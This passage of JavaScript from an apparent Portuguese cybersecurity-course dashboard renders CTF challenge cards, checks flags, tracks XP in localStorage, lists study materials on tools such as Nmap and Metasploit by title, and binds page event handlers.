  Desafios independentes. Cada flag resolvida conta para o teu XP e posição no leaderboard da turma.
</div>
<div class="ctf-arena-grid">
  ${mod.arenaChalls.map(c => {
    const solved = p.ctfArena && p.ctfArena[c.id];
    return `
<div class="ctf-arena-card difficulty-${c.diff}${solved ? ' solved' : ''}">
  <div class="ctf-arena-card-title">${solved ? '✓ ' : ''}${c.title}</div>
  <div class="ctf-arena-card-type">${c.type}</div>
  <div class="jshook-arena-card-desc">${c.desc}</div>
  ${!solved ? `
  <input class="lab-ctf-input jshook-arena-input" id="arena-input-${c.id}" type="text" placeholder="flag{...}"
         data-lab-arena-mod="${mod.id}" data-lab-arena-chall="${c.id}" data-lab-arena-flag="${c.flag}" data-lab-arena-xp="${c.xp}">
  <div class="ctf-arena-card-meta">
    <span class="ctf-arena-diff ${c.diff}">${c.diff.toUpperCase()}</span>
    <span class="ctf-arena-xp">+${c.xp} XP</span>
  </div>
  <div class="lab-ctf-result" id="arena-result-${c.id}"></div>
  ` : `<div class="ctf-arena-card-meta"><span class="ctf-arena-diff ${c.diff}">${c.diff.toUpperCase()}</span><span class="ctf-arena-xp jshook-success-text">✓ +${c.xp} XP</span></div>`}
</div>
    `;
  }).join('')}
</div>
            `;
        }

        // ── Actions ───────────────────────────────────────────────────────
        function labToggleStep(moduleId, stepIdx) {
            labLoadProgress();
            if (!_labProgress[moduleId]) _labProgress[moduleId] = { steps: {}, ctfSolved: false, ctfArena: {} };
            const wasOff = !_labProgress[moduleId].steps[stepIdx];
            _labProgress[moduleId].steps[stepIdx] = wasOff;
            if (!wasOff) delete _labProgress[moduleId].steps[stepIdx];
            labSaveProgress();
            const mod = LAB_MODULES.find(m => m.id === moduleId);
            if (wasOff && mod) labToast(`+${mod.steps[stepIdx].xp} XP — "${mod.steps[stepIdx].title}" concluído!`, 'xp');
            const detail = document.getElementById('lab-detail-box');
            if (detail) {
                const labsPanel = document.getElementById('lab-panel-labs');
                if (labsPanel) labsPanel.innerHTML = labRenderLabs(mod);
            }
            labRefreshModuleCard(moduleId);
            labRefreshStats();
        }

        function labSubmitFlag(moduleId) {
            const input = document.getElementById(`ctf-input-${moduleId}`);
            const result = document.getElementById(`ctf-result-${moduleId}`);
            if (!input || !result) return;
            const mod = LAB_MODULES.find(m => m.id === moduleId);
            if (!mod) return;
            const val = input.value.trim();
            if (val === mod.ctfFlag) {
                labLoadProgress();
                if (!_labProgress[moduleId]) _labProgress[moduleId] = { steps: {}, ctfSolved: false, ctfArena: {} };
                _labProgress[moduleId].ctfSolved = true;
                labSaveProgress();
                labToast(`🏆 Flag correcta! +100 XP`, 'xp');
                const ctfPanel = document.getElementById('lab-panel-ctf');
                if (ctfPanel) { ctfPanel.innerHTML = labRenderCTF(mod); applyDeferredStyles(ctfPanel); }
                labRefreshModuleCard(moduleId);
                labRefreshStats();
            } else {
                result.className = 'lab-ctf-result wrong';
                result.textContent = 'Flag incorrecta. Continua a tentar!';
                input.style.borderColor = 'rgba(248,81,73,0.5)';
                setTimeout(() => { input.style.borderColor = ''; result.className = 'lab-ctf-result'; }, 2000);
            }
        }

        function labSubmitArena(moduleId, challId, correctFlag, xp) {
            const input = document.getElementById(`arena-input-${challId}`);
            const result = document.getElementById(`arena-result-${challId}`);
            if (!input) return;
            const val = input.value.trim();
            if (val === correctFlag) {
                labLoadProgress();
                if (!_labProgress[moduleId]) _labProgress[moduleId] = { steps: {}, ctfSolved: false, ctfArena: {} };
                if (!_labProgress[moduleId].ctfArena) _labProgress[moduleId].ctfArena = {};
                _labProgress[moduleId].ctfArena[challId] = true;
                labSaveProgress();
                labToast(`🏴 Flag correcta! +${xp} XP`, 'xp');
                const mod = LAB_MODULES.find(m => m.id === moduleId);
                const arenaPanel = document.getElementById('lab-panel-arena');
                if (arenaPanel && mod) { arenaPanel.innerHTML = labRenderArena(mod); applyDeferredStyles(arenaPanel); }
                labRefreshModuleCard(moduleId);
                labRefreshStats();
            } else {
                if (result) {
                    result.className = 'lab-ctf-result wrong';
                    result.textContent = 'Incorrecta.';
                    setTimeout(() => { result.className = 'lab-ctf-result'; }, 1500);
                }
            }
        }

        function labToggleHint(moduleId) {
            const hint = document.getElementById(`ctf-hint-${moduleId}`);
            if (!hint) return;
            const showing = hint.style.display === 'block';
            hint.style.display = showing ? 'none' : 'block';
        }

        function labRefreshModuleCard(moduleId) {
            const grids = document.querySelectorAll('.lab-modules-grid');
            grids.forEach(grid => {
                grid.innerHTML = LAB_MODULES.map((mod, idx) => labRenderModuleCard(mod, idx)).join('');
                applyDeferredStyles(grid);
            });
        }

        function labRefreshStats() {
            const totalXP = labTotalXP();
            const maxXP = labMaxXP();
            const xpPct = maxXP > 0 ? Math.round((totalXP / maxXP) * 100) : 0;
            const completedMods = LAB_MODULES.filter(m => labCalcModulePct(m) === 100).length;
            const ctfsSolved = LAB_MODULES.reduce((acc, m) => {
                const p = labGetModuleProgress(m.id);
                return acc + (p.ctfSolved ? 1 : 0);
            }, 0);
            const xpVal = document.querySelector('.lab-xp-value');
            if (xpVal) {
                xpVal.innerHTML = `${totalXP} <span class="jshook-xp-max-suffix">/ ${maxXP}</span>`;
                applyDeferredStyles(xpVal);
            }
            const xpFill = document.querySelector('.lab-xp-progress-fill');
            if (xpFill) xpFill.style.width = xpPct + '%';
            const statVals = document.querySelectorAll('.lab-stat-value');
            if (statVals[0]) statVals[0].textContent = completedMods;
            if (statVals[1]) statVals[1].textContent = ctfsSolved;
            if (statVals[2]) statVals[2].textContent = totalXP;
            if (statVals[3]) statVals[3].textContent = xpPct + '%';
        }

        // ── Toast ─────────────────────────────────────────────────────────
        let _labToastTimer = null;
        function labToast(msg, type = 'xp') {
            let t = document.getElementById('lab-toast');
            if (!t) {
                t = document.createElement('div');
                t.id = 'lab-toast';
                t.className = 'lab-toast';
                document.body.appendChild(t);
            }
            t.textContent = msg;
            t.className = `lab-toast ${type}`;
            requestAnimationFrame(() => { t.classList.add('show'); });
            clearTimeout(_labToastTimer);
            _labToastTimer = setTimeout(() => { t.classList.remove('show'); }, 3000);
        }

        // ── CHEATSHEETS ─────────────────────────────────────────────────
        const CS_TABS = { python: 'cheatsheet_python.html', sql: 'cheatsheet_sql_cybersec.html', cybersec: 'cheatsheet_cybersec.html' };
        const _csCache = {};
        let _csShadow = null;

        function csInitChips(root, key) {
            const isSQL      = key === 'sql';
            const badgeSel   = isSQL ? '.header-right .badge' : '.header-right .phase-badge';
            const secSel     = isSQL ? '.grid .sec' : '.grid .section';
            const innerBadge = isSQL ? '.sec-hd .badge' : '.section-header .phase-badge';
            const pfx        = isSQL ? 'c-' : 'p-';

            const allChip  = root.querySelector('.chip-all');
            const chips    = Array.from(root.querySelectorAll(badgeSel + ':not(.chip-all)'));
            const sections = Array.from(root.querySelectorAll(secSel));

            function phaseOf(el) { return Array.from(el.classList).find(c => c.startsWith(pfx)); }
            function showAll() {
                sections.forEach(s => s.classList.remove('filtered-out'));
                chips.forEach(c => c.classList.remove('chip-active', 'chip-dimmed'));
                if (allChip) { allChip.classList.add('chip-active'); allChip.classList.remove('chip-dimmed'); }
            }
            if (allChip) { allChip.classList.add('chip-active'); allChip.addEventListener('click', showAll); }
            chips.forEach(chip => {
                chip.addEventListener('click', () => {
                    if (chip.classList.contains('chip-active')) { showAll(); return; }
                    const phase = phaseOf(chip);
                    chips.forEach(c => { c.classList.remove('chip-active'); c.classList.add('chip-dimmed'); });
                    if (allChip) { allChip.classList.remove('chip-active'); allChip.classList.add('chip-dimmed'); }
                    chip.classList.add('chip-active'); chip.classList.remove('chip-dimmed');
                    sections.forEach(s => {
                        const b = s.querySelector(innerBadge);
                        s.classList.toggle('filtered-out', !(b && b.classList.contains(phase)));
                    });
                });
            });
        }

        async function csSwitch(key) {
            document.querySelectorAll('.cs-tab').forEach(btn => {
                btn.classList.toggle('cs-chip-active', btn.getAttribute('data-cs') === key);
            });
            const link = document.getElementById('cs-open-link');
            if (link) link.href = CS_TABS[key];

            const host = document.getElementById('cs-host');
            if (!_csShadow) {
                _csShadow = host.attachShadow({ mode: 'open' });
                document.getElementById('cs-tab-bar').addEventListener('click', e => {
                    const btn = e.target.closest('.cs-tab');
                    if (btn) csSwitch(btn.getAttribute('data-cs'));
                });
            }

            if (!_csCache[key]) {
                const res = await fetch(CS_TABS[key]);
                _csCache[key] = await res.text();
            }
            _csShadow.innerHTML = _csCache[key];
            csInitChips(_csShadow, key);
        }

        // ── MATERIAIS (skills) ───────────────────────────────────────────
        /**
         * @typedef {{key:string, icon:string, label:string, status:'ready'|'soon', file?:string}} SkillItem
         * @typedef {{key:string, icon:string, label:string, items:SkillItem[]}} SkillCategory
         */

        /** @type {SkillCategory[]} */
        const SKILLS_CATEGORIES = [
            { key: 'networking', icon: '📡', label: 'Networking', items: [
                { key: 'tcp-ip-model', icon: '📡', label: 'Modelo TCP/IP', file: 'redes/tcp-ip-model.html', status: 'ready' },
                { key: 'osi-model', icon: '🧅', label: 'Modelo OSI', file: 'redes/osi-model.html', status: 'ready' },
                { key: 'udp-model', icon: '📨', label: 'UDP', file: 'redes/udp-model.html', status: 'ready' },
                { key: 'ip-classes', icon: '🔢', label: 'Classes de Endereços IP', file: 'redes/ip-classes.html', status: 'ready' },
                { key: 'sistemas-numericos', icon: '🧮', label: 'Sistemas Numéricos (Quiz + Conversor)', file: 'redes/sistemas-numericos.html', status: 'ready' },
                { key: 'topologias-rede', icon: '🕸️', label: 'Topologias de Rede', file: 'redes/topologias-rede.html', status: 'ready' },
                { key: 'switch-vlan-router', icon: '🔀', label: 'Switch · VLAN · Router', file: 'redes/switch-vlan-router.html', status: 'ready' },
                { key: 'redes-computadores', icon: '🖧', label: 'Redes de Computadores (UC01478)', file: 'redes/redes-computadores.html', status: 'ready' },
            ] },
            { key: 'sistemas', icon: '🖥️', label: 'System Fundamentals', items: [
                { key: 'windows-internals', icon: '🪟', label: 'Windows Internals', status: 'soon' },
                { key: 'linux-commands', icon: '🐧', label: 'Linux Commands', status: 'soon' },
                { key: 'file-systems', icon: '🗂️', label: 'File Systems', status: 'soon' },
                { key: 'ports-services', icon: '🔌', label: 'Ports & Services', status: 'soon' },
            ] },
            { key: 'security-concepts', icon: '🛡️', label: 'Security Concepts', items: [
                { key: 'cia-triad', icon: '🔺', label: 'CIA Triad', file: 'seguranca/cia-triad.html', status: 'ready' },
                { key: 'firewalls', icon: '🧱', label: 'Firewalls', file: 'seguranca/firewalls.html', status: 'ready' },
                { key: 'ids-ips', icon: '🚨', label: 'IDS / IPS', file: 'seguranca/ids-ips.html', status: 'ready' },
                { key: 'vpn-proxies', icon: '🕵️', label: 'VPN & Proxies', file: 'seguranca/vpn-proxies.html', status: 'ready' },
            ] },
            { key: 'tools-platforms', icon: '🧰', label: 'Tools & Platforms', items: [
                { key: 'nmap', icon: '🛰️', label: 'Nmap', file: 'kali/nmap.html', status: 'ready' },
                { key: 'wireshark', icon: '🦈', label: 'Wireshark', file: 'kali/wireshark.html', status: 'ready' },
                { key: 'kali-linux', icon: '🐉', label: 'Kali Linux', file: 'kali/kali-tools.html', status: 'ready' },
                { key: 'virtualbox', icon: '📦', label: 'VirtualBox', status: 'soon' },
            ] },
            { key: 'databases', icon: '🗄️', label: 'Databases', items: [
                { key: 'sql-queries', icon: '🗄️', label: 'SQL Queries', file: 'cheatsheet_sql_cybersec.html', status: 'ready' },
                { key: 'postgresql', icon: '🐘', label: 'PostgreSQL', file: 'databases/postgresql.html', status: 'ready' },
                { key: 'nosql', icon: '🍃', label: 'NoSQL', file: 'databases/nosql.html', status: 'ready' },
                { key: 'pyspark', icon: '⚡', label: 'PySpark', file: 'databases/pyspark.html', status: 'ready' },
                { key: 'hadoop', icon: '🐘', label: 'Hadoop', file: 'databases/hadoop.html', status: 'ready' },
            ] },
            { key: 'web-security', icon: '🌐', label: 'Web Security', items: [
                { key: 'owasp-top10', icon: '🔟', label: 'OWASP Top 10:2025', file: 'web-security/owasp-top10.html', status: 'ready' },
                { key: 'sql-injection', icon: '💉', label: 'SQL Injection', file: 'kali/sqlmap.html', status: 'ready' },
                { key: 'xss-csrf', icon: '🧬', label: 'XSS & CSRF', file: 'web-security/xss-csrf.html', status: 'ready' },
                { key: 'burp-suite', icon: '🦊', label: 'Burp Suite', file: 'kali/burp.html', status: 'ready' },
            ] },
            { key: 'python', icon: '🐍', label: 'Python', items: [
                { key: 'scripting-vs-programming', icon: '📜', label: 'Scripting vs Programming Language', file: 'python/scripting-vs-programming-language.html', status: 'ready' },
                { key: 'porque-usar-funcoes', icon: '🧩', label: 'Porquê usar Funções?', file: 'python/porque-usar-funcoes.html', status: 'ready' },
                { key: 'try-except-ficheiros', icon: '🧯', label: 'Try/Except, Ficheiros, Loops, Regex e Sets', file: 'python/try-except-ficheiros-loops-regex-sets.html', status: 'ready' },
                { key: 'tuples-listas-dicionarios', icon: '📦', label: 'Tuples, Listas e Dicionários', file: 'python/tuples-listas-dicionarios.html', status: 'ready' },
                { key: 'search-find', icon: '🔎', label: 'search e find', file: 'python/search-find.html', status: 'ready' },
                { key: 'sorted', icon: '🔀', label: 'sorted()', file: 'python/sorted.html', status: 'ready' },
            ] },
            { key: 'ethical-hacking', icon: '🎯', label: 'Ethical Hacking', items: [
                { key: 'recon-scanning', icon: '🔍', label: 'Recon & Scanning', file: 'cheatsheet_cybersec.html', status: 'ready' },
                { key: 'vulnerability-scan', icon: '🩻', label: 'Vulnerability Scan', file: 'kali/nikto.html', status: 'ready' },
                { key: 'exploitation-basics', icon: '💥', label: 'Exploitation Basics', file: 'kali/searchsploit.html', status: 'ready' },
                { key: 'metasploit', icon: '🧨', label: 'Metasploit', file: 'kali/metasploit.html', status: 'ready' },
            ] },
            { key: 'threats-defense', icon: '🦠', label: 'Threats & Defense', items: [
                { key: 'malware-types', icon: '🦠', label: 'Malware Types', status: 'soon' },
                { key: 'social-engineering', icon: '🎭', label: 'Social Engineering', status: 'soon' },
                { key: 'email-attacks', icon: '📧', label: 'Email Attacks', status: 'soon' },
                { key: 'endpoint-security', icon: '🖥️', label: 'Endpoint Security', status: 'soon' },
            ] },
            { key: 'forense-digital', icon: '🕵️', label: 'Forense Digital', items: [
                { key: 'forense-digital-fundamentos', icon: '🔬', label: 'Forense Digital — Fundamentos', file: 'forense-digital/forense-digital.html', status: 'ready' },
            ] },
            { key: 'password-cracking-extra', icon: '🔓', label: 'Password Cracking & Extra Tools', items: [
                { key: 'hashcat', icon: '⚙️', label: 'Hashcat', file: 'kali/hashcat.html', status: 'ready' },
                { key: 'john-the-ripper', icon: '🔪', label: 'John the Ripper', file: 'kali/john.html', status: 'ready' },
                { key: 'hydra', icon: '🐲', label: 'Hydra', file: 'kali/hydra.html', status: 'ready' },
                { key: 'aircrack-ng', icon: '📶', label: 'Aircrack-ng', file: 'kali/aircrack-ng.html', status: 'ready' },
                { key: 'netcat', icon: '🔧', label: 'Netcat', file: 'kali/netcat.html', status: 'ready' },
                { key: 'penelope', icon: '🐚', label: 'Penelope (Shells)', file: 'kali/penelope.html', status: 'ready' },
                { key: 'nmap-playground', icon: '🎮', label: 'Nmap Playground', file: 'kali/nmap-playground.html', status: 'ready' },
            ] },
        ];

        let _skillsRendered = false;

        function skillsRenderCats() {
            const grid = document.getElementById('skill-cats-grid');
            if (!grid || _skillsRendered) return;
            _skillsRendered = true;
            grid.innerHTML = SKILLS_CATEGORIES.map(cat => {
                const ready = cat.items.filter(i => i.status === 'ready').length;
                return `
                <div class="skill-cat-card" data-cat="${cat.key}">
                    <div class="skill-cat-header" data-cat-toggle="${cat.key}">
                        <span class="skill-cat-icon">${cat.icon}</span>
                        <div class="skill-cat-info">
                            <span class="skill-cat-label">${escapeHtml(cat.label)}</span>
                            <span class="skill-cat-progress">${ready}/${cat.items.length} prontos</span>
                        </div>
                        <span class="skill-cat-chevron">▸</span>
                    </div>
                    <div class="skill-items">
                        ${cat.items.map(item => item.status === 'ready'
                            ? `<button class="skill-item" data-cat="${cat.key}" data-item="${item.key}">
                                <span class="skill-item-icon">${item.icon}</span>
                                <span class="skill-item-label">${escapeHtml(item.label)}</span>
                               </button>`
                            : `<div class="skill-item skill-item-soon">
                                <span class="skill-item-icon">${item.icon}</span>
                                <span class="skill-item-label">${escapeHtml(item.label)}</span>
                                <span class="skill-item-badge">Em breve</span>
                               </div>`
                        ).join('')}
                    </div>
                </div>`;
            }).join('');

            grid.addEventListener('click', e => {
                const toggle = e.target.closest('[data-cat-toggle]');
                if (toggle) { skillsToggleCat(toggle.dataset.catToggle); return; }
                const itemBtn = e.target.closest('.skill-item[data-item]');
                if (itemBtn) skillsOpenItem(itemBtn.dataset.cat, itemBtn.dataset.item);
            });
        }

        /** @param {string} catKey */
        function skillsToggleCat(catKey) {
            const card = document.querySelector(`.skill-cat-card[data-cat="${catKey}"]`);
            if (!card) return;
            const wasOpen = card.classList.contains('open');
            document.querySelectorAll('.skill-cat-card.open').forEach(c => c.classList.remove('open'));
            if (!wasOpen) card.classList.add('open');
        }

        /**
         * @param {string} catKey
         * @param {string} itemKey
         */
        function skillsOpenItem(catKey, itemKey) {
            const cat = SKILLS_CATEGORIES.find(c => c.key === catKey);
            const item = cat?.items.find(i => i.key === itemKey);
            if (!item || item.status !== 'ready' || !item.file) return;
            document.getElementById('materiais-item-frame').src = item.file;
            document.getElementById('materiais-item-title').textContent = item.icon + ' ' + item.label;
            document.getElementById('materiais-item-open-link').href = item.file;
            switchView('materiais-item');
        }

        // ── LINKS ÚTEIS ──────────────────────────────────────────────────
        const USEFUL_LINKS = [
            {
                category: 'Moodle',
                icon: '🎓',
                items: [
                    { label: 'Moodle IEFP', url: 'https://fad.iefp.pt/login/index.php', desc: 'Acesso ao Moodle IEFP' },
                    { label: 'Testes e avaliações', url: 'https://fad.iefp.pt/grade/report/user/index.php?id=11527', desc: 'Ver notas e resultados' },
                ]
            },
            {
                category: 'Turma',
                icon: '💬',
                items: [
                    { label: 'Grupo WhatsApp', url: 'https://chat.whatsapp.com/G0V9T1C1zCoD1ACneb7hXz?mode=gi_t', desc: 'Chat da turma no WhatsApp Web' },
                ]
            },
        ];

        // ── AULAS REMOTAS ────────────────────────────────────────────────
        const REMOTE_CLASS_LINKS = [
            { label: 'Classroom Ivan', icon: '🎓', url: 'https://classroom.google.com/u/0/c/ODY2NDE0NTcxNTgy', desc: 'Google Classroom — Ivan Gonçalves' },
            { label: 'Google Drive Manuel', icon: '📂', url: 'https://drive.google.com/drive/folders/1yk20TBCoPnuHoU3CL_bc9y6BK8bjHXM8', desc: 'Google Drive — Materiais e recursos do Manuel' },
        ];

        function dashLinksRender() {
            const el = document.getElementById('dash-links');
            if (!el) return;
            const allItems = USEFUL_LINKS.flatMap(g => g.items.map(item => ({ ...item, icon: g.icon })));
            el.innerHTML = `<div class="dash-links-row">${allItems.map(item => `
                <a class="dash-link-chip" href="${escapeHtml(item.url)}" target="_blank" rel="noopener noreferrer" title="${escapeHtml(item.desc)}">
                    <span class="dash-link-icon">${item.icon}</span>
                    <span class="dash-link-label">${escapeHtml(item.label)}</span>
                    <span class="dash-link-arrow">↗</span>
                </a>`).join('')}
            </div>`;
        }

        function dashRemoteLinksRender() {
            const el = document.getElementById('dash-remote-links');
            if (!el) return;
            el.innerHTML = `<div class="dash-links-row">${REMOTE_CLASS_LINKS.map(item => {
                const pending = !item.url;
                return pending
                    ? `<span class="dash-link-chip dash-link-chip-pending" title="${escapeHtml(item.desc)}">
                        <span class="dash-link-icon">${item.icon}</span>
                        <span class="dash-link-label">${escapeHtml(item.label)}</span>
                    </span>`
                    : `<a class="dash-link-chip" href="${escapeHtml(item.url)}" target="_blank" rel="noopener noreferrer" title="${escapeHtml(item.desc)}">
                        <span class="dash-link-icon">${item.icon}</span>
                        <span class="dash-link-label">${escapeHtml(item.label)}</span>
                        <span class="dash-link-arrow">↗</span>
                    </a>`;
            }).join('')}
            </div>`;
        }

        function linksRender() {
            const grid = document.getElementById('links-grid');
            if (!grid || grid._rendered) return;
            grid._rendered = true;

            grid.innerHTML = USEFUL_LINKS.map(group => `
                <div class="links-group">
                    <div class="links-group-title">${group.icon} ${escapeHtml(group.category)}</div>
                    <div class="links-cards">
                        ${group.items.map(item => `
                            <a class="link-card" href="${escapeHtml(item.url)}" target="_blank" rel="noopener noreferrer">
                                <div class="link-card-label">${escapeHtml(item.label)}</div>
                                <div class="link-card-desc">${escapeHtml(item.desc)}</div>
                                <div class="link-card-arrow">↗</div>
                            </a>
                        `).join('')}
                    </div>
                </div>
            `).join('');
        }

        // ── CACHE BUST ON NEW BUILD ──────────────────────────────────────
        (function bustStaleCache() {
            try {
                const stored = localStorage.getItem('_appv');
                if (stored !== BUILD_TS) {
                    // Clear stale derived-cache keys; preserve user data
                    const keep = new Set(['pending_invite', 'dashboard_theme', 'chat_last_read', 'lab_progress']);
                    const toRemove = [];
                    for (let i = 0; i < localStorage.length; i++) {
                        const k = localStorage.key(i);
                        if (!keep.has(k) && !k.startsWith('uc_notes_')) toRemove.push(k);
                    }
                    toRemove.forEach(k => localStorage.removeItem(k));
                    localStorage.setItem('_appv', BUILD_TS);
                    // Clear any browser/PWA caches
                    if ('caches' in window) {
                        caches.keys().then(names => names.forEach(n => caches.delete(n)));
                    }
                }
            } catch(e) { /* silencioso */ }
        })();

        // ── CAPTURAR TOKEN DE CONVITE NO URL ────────────────────────────
        // localStorage (não sessionStorage) — sobrevive ao signInWithRedirect em mobile.
        // TTL de 10 min para limitar janela de exposição.
        const _INVITE_TTL = 10 * 60 * 1000;
        function _readPendingInvite() {
            try {
                const raw = localStorage.getItem('pending_invite');
                if (!raw) return null;
                const { token, exp } = JSON.parse(raw);
                if (Date.now() > exp) { localStorage.removeItem('pending_invite'); return null; }
                return token;
            } catch { localStorage.removeItem('pending_invite'); return null; }
        }

        (function captureInviteToken() {
            try {
                const params = new URLSearchParams(window.location.search);
                const token  = params.get('invite');
                if (token && /^[a-f0-9]{32,64}$/.test(token)) {
                    localStorage.setItem('pending_invite', JSON.stringify({ token, exp: Date.now() + _INVITE_TTL }));
                    history.replaceState({}, '', window.location.pathname);
                    const badge = document.getElementById('auth-invite-badge');
                    if (badge) badge.style.display = 'block';
                }
                // Mostrar badge se já havia token válido guardado (utilizador voltou após redirect)
                if (_readPendingInvite()) {
                    const badge = document.getElementById('auth-invite-badge');
                    if (badge) badge.style.display = 'block';
                }
            } catch(e) { /* silencioso */ }
        })();

        // ── INIT ────────────────────────────────────────────────────────
        function init() {
            renderCronograma();
            buildTodayPanel();
            initTheme();
            setupNotifications();
            setupFileDrop();
            renderDashboardGreeting();
            dashLinksRender();
            dashRemoteLinksRender();
            renderTurma();

            if (HORARIOS.length > 0) {
                renderHorario();
            } else {
                scheduleGrid.innerHTML = `<div class="empty-state"><h3>Sem Dados</h3><p>Sem ficheiros de horário.</p></div>`;
            }

            switchView('dashboard');
        }

        window.addEventListener('error', e => {
            const msg = document.getElementById('auth-err');
            if (msg && document.getElementById('auth-gate').style.display !== 'none') {
                msg.textContent = 'Erro JS: ' + e.message + ' (' + (e.filename||'').split('/').pop() + ':' + e.lineno + ')';
                msg.style.display = 'block';
            }
            console.error('Uncaught:', e.message, e.filename, e.lineno);
        });

        document.addEventListener('DOMContentLoaded', () => {
            updateClock();
            setInterval(updateClock, 1000);
            _bindStaticHandlers();
            initAuth(); // calls init() after successful auth
        });

        function _bindStaticHandlers() {
            // Auth gate
            document.getElementById('auth-google-btn').addEventListener('click', () => signInWithGoogle());
            document.getElementById('auth-ms-btn').addEventListener('click', () => signInWithMicrosoftPersonal());

            // Nav sidebar — event delegation for data-view buttons
            document.querySelector('.nav-sidebar .nav-items').addEventListener('click', e => {
                const btn = e.target.closest('[data-view]');
                if (btn) switchView(btn.dataset.view);
            });
            document.getElementById('materiais-back-btn').addEventListener('click', () => switchView('materiais'));
            document.getElementById('nav-signout-btn').addEventListener('click', () => auth.signOut());
            document.getElementById('nav-mobile-toggle').addEventListener('click', () => navSidebarOpen());
            document.getElementById('nav-sidebar-overlay').addEventListener('click', () => navSidebarClose());

            // Horário toolbar
            document.getElementById('schedule-filter').addEventListener('input', e => filterHorario(e.target.value));
            document.getElementById('btn-view-cards').addEventListener('click', () => setScheduleView('cards'));
            document.getElementById('btn-view-week').addEventListener('click', () => setScheduleView('week'));
            // PDF month dropdowns — botão abre dropdown, download só via seleção de mês
            function buildPdfMenus() {
                ['lista', 'semanal'].forEach(type => {
                    const menu = document.getElementById(`pdf-${type}-menu`);
                    if (!menu) return;
                    menu.innerHTML = HORARIOS.map((h, i) => {
                        const label = h.mes_ano.charAt(0).toUpperCase() + h.mes_ano.slice(1);
                        return `<button class="pdf-month-item" data-idx="${i}" data-type="${type}">${label}</button>`;
                    }).join('');
                    menu.addEventListener('click', e => {
                        const item = e.target.closest('.pdf-month-item');
                        if (!item) return;
                        const idx  = parseInt(item.dataset.idx);
                        const btn  = document.getElementById(`btn-pdf-${item.dataset.type}`);
                        menu.classList.add('hidden');
                        if (item.dataset.type === 'lista') downloadListaPDF(btn, idx);
                        else downloadSemanalPDF(btn, idx);
                    });
                });
            }
            buildPdfMenus();
            document.getElementById('btn-pdf-lista').addEventListener('click', e => {
                e.stopPropagation();
                document.getElementById('pdf-semanal-menu').classList.add('hidden');
                document.getElementById('pdf-lista-menu').classList.toggle('hidden');
            });
            document.getElementById('btn-pdf-semanal').addEventListener('click', e => {
                e.stopPropagation();
                document.getElementById('pdf-lista-menu').classList.add('hidden');
                document.getElementById('pdf-semanal-menu').classList.toggle('hidden');
            });
            document.addEventListener('click', () => {
                document.getElementById('pdf-lista-menu').classList.add('hidden');
                document.getElementById('pdf-semanal-menu').classList.add('hidden');
            });

            // Disciplinas search
            document.getElementById('uc-search').addEventListener('input', e => filterUCs(e.target.value));
            document.getElementById('btn-disc-view-cards').addEventListener('click', () => setDisciplinesView('cards'));
            document.getElementById('btn-disc-view-list').addEventListener('click', () => setDisciplinesView('list'));

            // Playground lang buttons
            document.getElementById('pg-btn-python').addEventListener('click', () => pgNewTab('python'));
            document.getElementById('pg-btn-sql').addEventListener('click', () => pgNewTab('sql'));

            // UC detail
            document.getElementById('back-btn-uc-detail').addEventListener('click', () => goBackFromDetail());
            document.getElementById('btn-pdf-uc').addEventListener('click', function() { downloadUCPDF(this); });
            document.getElementById('uc-chat-input').addEventListener('keydown', e => ucChatKey(e));
            document.getElementById('uc-chat-send').addEventListener('click', () => ucChatSend());

            // Notes tabs
            document.getElementById('notes-tab-edit').addEventListener('click', () => switchNotesTab('edit'));
            document.getElementById('notes-tab-preview').addEventListener('click', () => switchNotesTab('preview'));

            // Session detail
            document.getElementById('back-btn-session-detail').addEventListener('click', () => goBackFromSession());
            document.getElementById('session-mat-url').addEventListener('input', function() {
                if (getYouTubeId(this.value)) document.getElementById('session-mat-type').value = 'video';
            });
            document.getElementById('session-mat-add-btn').addEventListener('click', () => addSessionMaterial());
            document.getElementById('file-input').addEventListener('change', e => handleFileSelect(e));

            // Chat views
            document.getElementById('chat-view-input').addEventListener('keydown', e => chatViewKey(e));
            document.getElementById('chat-view-send').addEventListener('click', () => chatViewSend());


            // Cheatsheet tabs — event delegation
            document.getElementById('cs-tab-bar').addEventListener('click', e => {
                const btn = e.target.closest('.cs-tab');
                if (btn) csSwitch(btn.dataset.cs);
            });

            // Settings
            document.getElementById('theme-toggle').addEventListener('click', () => toggleTheme());
            document.getElementById('notif-btn').addEventListener('click', () => requestNotifications());
            document.getElementById('settings-signout-btn').addEventListener('click', () => auth.signOut());
            document.getElementById('invite-btn-individual').addEventListener('click', () => createInvite('individual'));
            document.getElementById('invite-btn-turma').addEventListener('click', () => createInvite('turma'));

            // PDF modal
            document.getElementById('pdf-modal').addEventListener('click', e => closePdfModal(e));
            document.getElementById('pdf-modal-close').addEventListener('click', () => closePdfModalBtn());

            // Mobile bottom nav — event delegation
            document.getElementById('mobile-bottom-nav').addEventListener('click', e => {
                const btn = e.target.closest('[data-view]');
                if (btn) switchView(btn.dataset.view);
            });
            document.getElementById('mob-more-btn').addEventListener('click', () => mobMoreToggle());

            // Mobile more menu — event delegation
            document.getElementById('mob-more-overlay').addEventListener('click', () => mobMoreClose());
            document.getElementById('mob-more-menu').addEventListener('click', e => {
                const btn = e.target.closest('[data-view]');
                if (btn) { switchView(btn.dataset.view); mobMoreClose(); }
            });
            document.getElementById('mob-signout-btn').addEventListener('click', () => auth.signOut());

            // Lab — single delegated listener on the stable #view-lab container
            const labEl = document.getElementById('view-lab');
            if (labEl) {
                labEl.addEventListener('click', e => {
                    let t;
                    if ((t = e.target.closest('[data-lab-open]')))       { labOpenModule(t.dataset.labOpen); return; }
                    if ((t = e.target.closest('[data-lab-close]')))      { labCloseDetail(); return; }
                    if ((t = e.target.closest('[data-lab-tab]')))        { labSwitchTab(t.dataset.labTab); return; }
                    if ((t = e.target.closest('[data-lab-step-mod]')))   { labToggleStep(t.dataset.labStepMod, parseInt(t.dataset.labStepIdx)); return; }
                    if ((t = e.target.closest('[data-lab-submit-flag]'))) { labSubmitFlag(t.dataset.labSubmitFlag); return; }
                    if ((t = e.target.closest('[data-lab-hint]')))       { labToggleHint(t.dataset.labHint); return; }
                });
                labEl.addEventListener('keydown', e => {
                    if (e.key !== 'Enter') return;
                    let t;
                    if ((t = e.target.closest('[data-lab-flag-input]'))) { labSubmitFlag(t.dataset.labFlagInput); return; }
                    if ((t = e.target.closest('[data-lab-arena-mod]')))  {
                        labSubmitArena(t.dataset.labArenaMod, t.dataset.labArenaChall, t.dataset.labArenaFlag, parseInt(t.dataset.labArenaXp));
                    }
                });
            }

            // Chat delete buttons — event delegation on all chat containers
            ['chat-view-msgs', 'uc-chat-msgs'].forEach(id => {
                const el = document.getElementById(id);
                if (el) el.addEventListener('click', e => {
